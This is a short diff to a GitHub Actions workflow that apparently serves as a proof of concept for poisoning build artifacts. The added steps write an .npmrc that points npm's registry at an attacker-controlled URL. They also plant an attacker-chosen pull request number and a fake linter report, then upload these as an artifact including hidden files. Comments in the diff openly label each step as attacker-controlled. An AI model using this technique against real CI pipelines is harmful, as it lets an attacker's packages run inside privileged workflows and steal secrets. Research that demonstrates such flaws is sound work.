@@ -14,7 +14,7 @@ jobs:
         run: |
           mkdir -p payload
           # .npmrc redirects npm's registry to an attacker-controlled location
-          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg2/\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg4/\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
           # attacker-chosen PR number for the bot comment
           echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
           printf 'attacker-controlled linter report\n' > payload/linter-report.txt
@@ -26,5 +26,5 @@ jobs:
           path: payload/
           include-hidden-files: true
           if-no-files-found: error
-# rerun-trigger-1
+# rerun-trigger-2 npmreg4
 
